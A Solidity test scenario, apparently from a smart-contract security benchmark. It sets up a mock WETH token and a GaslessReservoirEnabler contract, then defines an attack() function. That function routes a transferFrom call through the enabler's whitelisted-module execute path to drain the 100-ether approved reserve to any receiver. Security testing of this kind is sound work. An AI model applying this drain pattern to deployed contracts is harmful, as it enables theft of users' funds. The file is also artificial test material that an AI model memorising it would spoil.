pragma solidity 0.8.11;
import "./contracts/normal_deployment/GaslessReservoirEnabler.sol";
interface IERC20Mini {function balanceOf(address) external view returns(uint); function allowance(address,address) external view returns(uint); function approve(address,uint) external returns(bool); function transferFrom(address,address,uint) external returns(bool);}
contract MockWETH {string public name="Wrapped Ether"; mapping(address=>uint) public balanceOf; mapping(address=>mapping(address=>uint)) public allowance; function mint(address a,uint n) external{balanceOf[a]+=n;} function approve(address s,uint n) external returns(bool){allowance[msg.sender][s]=n;return true;} function transferFrom(address f,address t,uint n) external returns(bool){require(balanceOf[f]>=n,"bal");require(allowance[f][msg.sender]>=n,"allow");if(allowance[f][msg.sender]!=type(uint).max)allowance[f][msg.sender]-=n;balanceOf[f]-=n;balanceOf[t]+=n;return true;}}
contract Scenario { GaslessReservoirEnabler public enabler; MockWETH public weth; uint public constant SEED=100 ether; constructor(){weth=new MockWETH(); enabler=new GaslessReservoirEnabler(address(this)); enabler.setModuleWhitelistStatus(address(weth),true); weth.mint(address(this),SEED); weth.approve(address(enabler),type(uint).max);} function attack(address receiver) external {GaslessReservoirEnabler.ExecutionInfo[] memory infos=new GaslessReservoirEnabler.ExecutionInfo[](1); infos[0]=GaslessReservoirEnabler.ExecutionInfo(address(weth),abi.encodeWithSelector(IERC20Mini.transferFrom.selector,address(this),receiver,SEED),0); GaslessReservoirEnabler.ERC20Transfer[] memory ts=new GaslessReservoirEnabler.ERC20Transfer[](0); enabler.erc20WithTransfersAndExecute(ts,infos);} function reserveBalance() external view returns(uint){return weth.balanceOf(address(this));} function attackerBalance(address a) external view returns(uint){return weth.balanceOf(a);} function asset() external view returns(address){return address(weth);} }
